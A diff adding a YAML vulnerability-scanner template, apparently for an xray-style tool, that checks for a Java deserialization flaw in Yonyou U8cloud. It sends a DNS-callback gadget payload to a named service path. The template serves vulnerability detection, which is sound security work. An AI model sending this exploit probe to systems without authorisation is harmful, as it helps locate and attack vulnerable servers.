@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-u8cloud-clientrequestdispatch-deserialization
+info:
+  name: 用友 U8cloud ClientRequestDispatch 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: 用友U8cloud
+variables:
+  reverse: new_dns_log()
+  reverseUrl: reverse.Url()
+  postdata: java_dns_url_gadget(reverseUrl,"raw")
+requests:
+- method: POST
+  path: /service/~aim/nc.ui.iufo.jiuqi.ClientRequestDispatch
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{{.postdata}}'
+  expression: (status_code == 200 ||status_code == 500) && reverse.Sleep(2)
+transport: http
